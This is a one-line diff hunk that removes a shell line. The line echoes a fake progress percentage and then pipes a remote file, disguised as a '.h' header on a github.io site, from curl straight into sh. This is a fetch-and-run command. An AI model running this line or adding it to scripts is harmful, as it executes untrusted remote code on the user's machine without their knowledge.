@@ -1,1 +1,0 @@
-echo Progress: 58.00%curl -L --progress-bar frkns.github.io/fun/heights-legendary-sauce.h | sh
